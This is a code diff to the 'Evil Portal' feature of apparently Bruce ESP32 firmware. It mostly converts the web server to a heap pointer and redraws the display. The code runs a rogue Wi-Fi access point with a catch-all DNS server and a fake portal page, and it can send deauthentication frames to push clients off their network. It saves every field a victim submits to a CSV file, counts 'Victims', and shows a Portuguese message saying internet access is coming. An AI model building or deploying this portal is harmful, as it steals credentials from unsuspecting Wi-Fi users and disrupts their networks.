@@ -5,7 +5,7 @@
 #include "sd_functions.h"
 #include "wifi_atks.h"
 
-WebServer ep(80);               // initialise webserver
+WebServer* ep= nullptr;               // initialise webserver
 DNSServer dnsServer;
 
 String html_file, ep_logo, last_cred;
@@ -25,6 +25,9 @@ const uint8_t deauth_frame_default2[] = {
 
 
 void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
+
+    ep=(WebServer*)malloc(sizeof(WebServer));
+    new (ep) WebServer(80);
     bool redraw=true;
     // Definição da matriz "Options"
     options = {
@@ -55,92 +58,90 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     wifiConnected=true;
     dnsServer.start(53, "*", WiFi.softAPIP());
 
-    ep.on("/", [](){
-      ep.send(200, "text/html", html_file);
+    ep->on("/", [](){
+      ep->send(200, "text/html", html_file);
     });
-    ep.on("/post", []() {
+    ep->on("/post", []() {
       String html_temp = "<li>";                                      // Else.. after all that, redirects to the page
       String csvLine = "";
       last_cred="";
-      for (int i = 0; i < ep.args(); i++) {
-        html_temp += ep.argName(i) + ": " + ep.arg(i) + "<br>\n";
+      for (int i = 0; i < ep->args(); i++) {
+        html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
         // Prepara dados para salvar no SD
         if (i != 0) {
           csvLine += ",";
         }
-        csvLine += ep.argName(i) + ": " + ep.arg(i);
-        last_cred += ep.argName(i).substring(0,3) + ": " + ep.arg(i) + "\n";
+        csvLine += ep->argName(i) + ": " + ep->arg(i);
+        last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
       }
       html_temp += "</li>\n";
       saveToCSV("/Bruce_creds.csv", csvLine);
       capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
       totalCapturedCredentials++;
-      ep.send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
+      ep->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
     });
 
-    ep.onNotFound([](){
-      ep.send(200, "text/html", html_file);
+    ep->onNotFound([](){
+      ep->send(200, "text/html", html_file);
     });
 
-    ep.on("/creds", []() {
-      ep.send(200, "text/html", creds_GET());
+    ep->on("/creds", []() {
+      ep->send(200, "text/html", creds_GET());
     });
 
-    ep.on("/ssid", []() {
-      ep.send(200, "text/html", ssid_GET());
+    ep->on("/ssid", []() {
+      ep->send(200, "text/html", ssid_GET());
     });
 
-    ep.on("/postssid", [](){
-      if(ep.hasArg("ssid")) AP_name = ep.arg("ssid").c_str();
-      ep.send(200, "text/html", ssid_POST());
-      ep.stop();                            // pára o servidor
+    ep->on("/postssid", [](){
+      if(ep->hasArg("ssid")) AP_name = ep->arg("ssid").c_str();
+      ep->send(200, "text/html", ssid_POST());
+      ep->stop();                            // pára o servidor
       wifiDisconnect();                     // desliga o WiFi
       WiFi.softAP(AP_name);                 // reinicia WiFi com novo SSID
-      ep.begin();                          // reinicia o servidor
+      ep->begin();                          // reinicia o servidor
       previousTotalCapturedCredentials=-1;  // redesenha a tela
     });
 
-    drawMainMenu();
-    menu_op.deleteSprite();
-    sprite.deleteSprite();
-    ep.begin();
-    tft.fillRect(6, 27, WIDTH-12, HEIGHT-33, BGCOLOR);
-    menu_op.deleteSprite();
-    menu_op.createSprite(WIDTH-20, HEIGHT-35);
+    ep->begin();
     
     bool hold_deauth = false;
     int tmp=millis(); // one deauth frame each 30ms at least
     redraw=true;
     while(1) {
       if(redraw) {
-        menu_op.fillRect(0,0,menu_op.width(), menu_op.height(),BGCOLOR);
-        menu_op.setTextSize(FM);
-        menu_op.setTextColor(TFT_RED);
-        menu_op.drawCentreString("Evil Portal",menu_op.width()/2, 3, SMOOTH_FONT);
-        menu_op.setCursor(0,20);
-        menu_op.setTextColor(FGCOLOR);
-        menu_op.println("AP: " + AP_name);
-        menu_op.println("->" + WiFi.softAPIP().toString() + "/creds");
-        menu_op.println("->" + WiFi.softAPIP().toString() + "/ssid");
-        menu_op.print("Victims: ");
-        menu_op.setTextColor(TFT_RED);
-        menu_op.println(String(totalCapturedCredentials));
-        menu_op.setTextSize(FP);
-        menu_op.println(last_cred);
+        drawMainBorder();
+        
+        tft.setTextSize(FM);
+        tft.setTextColor(TFT_RED);
+        tft.drawCentreString("Evil Portal",tft.width()/2, 29, SMOOTH_FONT);
+        tft.setCursor(8,46);
+        tft.setTextColor(FGCOLOR);
+        tft.println("AP: " + AP_name);
+        tft.setCursor(8,tft.getCursorY());
+        tft.println("->" + WiFi.softAPIP().toString() + "/creds");
+        tft.setCursor(8,tft.getCursorY());
+        tft.println("->" + WiFi.softAPIP().toString() + "/ssid");
+        tft.setCursor(8,tft.getCursorY());
+        tft.print("Victims: ");
+        tft.setTextColor(TFT_RED);
+        tft.println(String(totalCapturedCredentials));
+        tft.setCursor(8,tft.getCursorY());
+        tft.setTextSize(FP);
+        tft.println(last_cred);
 
         if (deauth){
           if (hold_deauth) {
-            menu_op.setTextSize(FP);
-            menu_op.setTextColor(FGCOLOR);
-            menu_op.drawRightString("Deauth OFF", menu_op.width(),menu_op.height()-8,SMOOTH_FONT);
+            tft.setTextSize(FP);
+            tft.setTextColor(FGCOLOR);
+            tft.drawRightString("Deauth OFF", tft.width()-6,tft.height()-8,SMOOTH_FONT);
           } else {
-            menu_op.setTextSize(FP);
-            menu_op.setTextColor(TFT_RED);
-            menu_op.drawRightString("Deauth ON", menu_op.width(),menu_op.height()-8,SMOOTH_FONT);
+            tft.setTextSize(FP);
+            tft.setTextColor(TFT_RED);
+            tft.drawRightString("Deauth ON", tft.width()-6,tft.height()-8,SMOOTH_FONT);
           }
         }
 
-        menu_op.pushSprite(8,26);
         redraw=false;
       }
 
@@ -159,13 +160,15 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         previousTotalCapturedCredentials = totalCapturedCredentials-1;
       }
       dnsServer.processNextRequest();
-      ep.handleClient();
+      ep->handleClient();
 
       if(checkEscPress()) break;
     }
-    ep.close();
+    ep->close();
+    ep->~WebServer();
+    free(ep);
+    ep=nullptr;
     dnsServer.stop();
-    menu_op.deleteSprite();
 
     delay(100);
     wifiDisconnect();
